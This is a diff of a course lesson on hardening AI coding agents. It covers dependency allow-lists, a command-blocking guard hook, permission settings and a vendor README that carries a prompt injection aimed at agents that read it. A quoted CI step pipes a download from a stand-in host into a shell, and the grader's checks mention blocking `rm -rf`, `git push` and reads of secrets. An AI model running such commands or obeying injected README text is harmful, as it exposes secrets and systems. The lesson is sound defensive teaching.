@@ -82,11 +82,11 @@ Hygiene, cheapest first: a **person** adds dependencies (CONTRIBUTING.md: a tick
 +        run: curl -s https://get.csvtidy.example.invalid/setup.sh | sh
 ```
 
-Three findings: two unapproved packages from an address nobody vetted, and no lockfile; a download piped into a shell inside CI, which holds secrets; no sign of a ticket or reviewer. `packages.invalid` never resolves; a real address would, and anyone can register a name an agent invents: slopsquatting. Neither is on the allow-list.
+Three findings: two unapproved packages from an address nobody vetted, and no lockfile; a download piped into a shell inside CI, which holds secrets; no sign of a ticket or reviewer. `packages.invalid` never resolves; a real address would. Neither is on the allow-list.
 
 **Insecure generated code.** Pearce et al. found about 40 percent of 1,689 Copilot programs vulnerable (a 2021-era tool); Perry et al. (CCS 2023), in one user study of an early assistant, found users wrote significantly less secure code yet were more likely to believe it secure. Results depend on task, tool and date: a reason to review, not a rate. Remit has a planted example, `Store.search_by_name`; find it with the security pass of lesson 5.1.
 
-**Licence, IP and data.** Ask what licence a new dependency carries, whether you pasted code you may not share, and who owns the output (policy decides; not legal advice, see [*AI Governance*, lesson 5.2 — Intellectual property in AI inputs and outputs](../aigp/index.html#/5.2)). Najm's rules: approved tools in approved environments; no Confidential or Restricted data and no secrets in prompts or agent contexts.
+**Licence, IP and data.** Ask what licence a new dependency carries, whether you pasted code you may not share, and who owns the output (policy decides; not legal advice, see [*AI Governance*, lesson 5.2 — Intellectual property in AI inputs and outputs](../aigp/index.html#/5.2)).
 
 **Prompt for the safe path.**
 
@@ -332,7 +332,7 @@ Lujain's agent proposed installing `invented-csvtidy-extras`, and the vendor REA
 
 Your script answers with its exit code.
 
-In your lab folder, test by hand, safely, since a sample is only text: `python .claude/hooks/guard.py < lab-assets/hook-samples/block-git-push.json; echo "exit=$?"`. Copy `lab-assets/guard_skeleton.py` to `.claude/hooks/guard.py` (`mkdir -p .claude/hooks` first; its first line only labels it for the course repository). It lets everything through:
+In your lab folder, test by hand, safely, since a sample is only text: `python .claude/hooks/guard.py < lab-assets/hook-samples/block-git-push.json; echo "exit=$?"`. Copy `lab-assets/guard_skeleton.py` to `.claude/hooks/guard.py` (`mkdir -p .claude/hooks` first). It lets everything through:
 
 ```python
 # ailab/labs/m08_harden/assets/guard_skeleton.py
@@ -413,7 +413,7 @@ From tokens you can split into commands, find each program (skipping `VAR=value`
 }
 ```
 
-Your sessions are then bound by the file: `deny` and `ask` apply at once, `/permissions` and `/hooks` show what loaded, and a running session may need a restart for a new hook. With no live session (no tool, or an agent that cannot open one), run `python -m json.tool .claude/settings.json` and the hook by hand, and say in your notes that you never saw Claude Code load it.
+Your sessions are then bound by the file: `deny` and `ask` apply at once, `/permissions` and `/hooks` show what loaded, and a running session may need a restart for a new hook. With no live session, run `python -m json.tool .claude/settings.json` and the hook by hand, and say in your notes that you never saw Claude Code load it.
 **The dependency check.** Names are compared after normalising, so `Typing_Helpers` equals `typing-helpers`, but `colorlib` for `colourlib` is a different package: flag it. Extras, markers, comments, `-r` lines and `--hash=` lines are not packages. From your lab folder, on the sample project:
 
 ```text
@@ -536,7 +536,7 @@ python -m ailab start m08 --dir ~/ainative/m08
 cd ~/ainative/m08    # your lab folder
 ```
 
-**Your move.** (1) Read `TASK.md`, then the vendor README yourself, as text. (2) Write tests for the guard from the ticket's rules, then `guard.py`, feeding samples with `<`. (3) Write `.claude/settings.json`. (4) Write the dependency check and `deps-allowlist.txt`; try it on `lab-assets/sample-project`. (5) Fill in `injection-notes.md`. (6) Commit each part with its tests and code, so `pytest -q` stays green, then grade. The grader gives `pytest -q` 60 seconds: call your functions directly for long lists of commands, and use a subprocess for a few exit-code tests. With an agent (parts 1 to 3): hand it the ticket and samples, ask for failing tests first, stay in default mode (it asks before it edits or runs) and read every diff; review its guard like a stranger's. Part 4 is yours: an agent exploring the repository reads that README unprompted, which is the attack, so keep it away from `lab-assets/vendor-readme/`.
+**Your move.** (1) Read `TASK.md`, then the vendor README yourself, as text. (2) Write tests for the guard from the ticket's rules, then `guard.py`, feeding samples with `<`. (3) Write `.claude/settings.json`. (4) Write the dependency check and `deps-allowlist.txt`; try it on `lab-assets/sample-project`. (5) Fill in `injection-notes.md`. (6) Commit each part with its tests and code, so `pytest -q` stays green, then grade. The grader gives `pytest -q` 60 seconds: call your functions directly for long lists of commands, and use a subprocess for a few exit-code tests. With an agent (parts 1 to 3): hand it the ticket and samples, ask for failing tests first, stay in default mode and read every diff; review its guard like a stranger's. Part 4 is yours: an agent exploring the repository reads that README unprompted, which is the attack, so keep it away from `lab-assets/vendor-readme/`.
 
 **What the grader checks.** Settings: valid rules, denies that cover the secrets, `git push` and `rm -rf` without stopping everyday work, no broad allow, the hook registered. Guard: dangerous samples blocked, harmless ones (heredocs included) allowed, unreadable input blocked. Dependency check: 18 small projects and your own repository. Notes: four sections, three of five tricks. Hygiene: tests, scope, secrets, commits.
 
